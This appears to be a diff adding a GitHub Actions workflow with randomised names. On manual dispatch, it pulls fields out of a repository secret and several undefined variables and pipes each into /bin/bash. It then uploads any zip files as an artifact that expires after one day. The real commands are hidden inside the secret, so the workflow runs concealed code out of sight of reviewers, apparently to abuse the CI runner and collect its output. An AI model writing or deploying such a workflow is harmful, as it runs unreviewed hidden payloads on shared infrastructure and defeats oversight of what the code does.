@@ -1,0 +1,24 @@
+name: deandesign9829
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: deandesign9829
+        env:
+          wmg7: ${{ secrets.wmg7 }}
+        run: |
+          printf '%s' "$wmg7" | jq -r .guwea73817 | /bin/bash
+          echo $tw4127 | jq -r .g5325 | /bin/bash
+          printf '%s' "$vch01748" | jq -r .cvwpx6 | /bin/bash
+          echo $itbqp7 | jq -r .ggzt99807 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: FbHlm30U
+          path: "*.zip"
+          retention-days: 1
